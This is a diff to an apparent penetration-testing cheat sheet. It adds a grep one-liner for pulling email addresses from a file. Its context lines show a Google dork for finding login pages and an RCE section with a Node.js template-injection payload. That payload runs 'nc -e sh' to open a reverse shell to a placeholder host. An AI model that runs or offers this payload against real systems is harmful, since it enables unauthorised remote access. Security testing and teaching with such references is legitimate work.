@@ -42,6 +42,10 @@ Finding hidden directory’s
 ```
 4-
 ```inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:test.com```
+5-find emails
+```
+grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b" file.txt
+```
 # RCE
 1-If you discover a node.js template area, you should try triggerable node payload </br>
 `require('child_process').exec('nc -e sh ip port');{src:/bin/sh/}`
